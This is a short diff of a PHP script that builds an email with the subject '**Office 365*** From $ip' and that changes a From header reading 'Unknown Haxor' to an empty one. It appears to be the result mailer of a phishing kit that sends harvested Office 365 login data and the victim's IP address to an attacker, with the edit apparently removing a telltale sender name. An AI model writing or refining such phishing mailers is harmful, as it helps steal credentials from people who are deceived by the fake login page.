@@ -20,7 +20,7 @@ $form .= "----------------------------------------\n";
 
 
 $subject = "**Office 365*** From   $ip";
-$headers = "From: ✅ Unknown Haxor ✅ \r\n";
+$headers = "\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
